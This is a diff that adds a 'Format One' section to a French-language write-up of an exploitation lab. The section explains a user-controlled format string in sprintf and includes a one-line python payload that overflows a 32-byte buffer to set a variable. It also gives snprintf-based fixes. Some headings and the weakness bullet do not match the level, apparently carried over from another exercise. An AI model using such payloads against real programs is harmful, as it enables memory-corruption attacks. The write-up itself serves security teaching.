@@ -104,4 +104,31 @@ locals.buffer[sizeof(locals.buffer)-1] = '\0';
 
 #### Remediation
 
-- remplacer gets par fgets(buffer, sizeof(buffer), stdin) et utiliser systématiquement des fonctions sûres pour les entrées utilisateur
+- remplacer gets par fgets(buffer, sizeof(buffer), stdin) et utiliser systématiquement des fonctions sûres pour les entrées utilisateur.
+
+### 4.2 Format One
+
+#### Identify the Weakness
+
+- gets + buffer de 64 octets + pointeur de fonction juste après → débordement de pile sur fp.
+
+#### Try to Exploit the Weakness 
+
+- sprintf(locals.dest, buffer) → format string contrôlée par l'utilisateur + buffer trop petit 
+
+#### Find CWE Linked to the Weakness
+
+```bash
+python3 -c 'print("%32x" + "lOvE")' | ./format-one
+```
+
+- %32x + "lOvE" → débordement dest[32] → changeme = 0x45764f6c.
+
+#### Remediation
+
+```c 
+sprintf(locals.dest, "%s", buffer)
+// ou 
+snprintf(locals.dest, 32, "%s", buffer)
+```
+
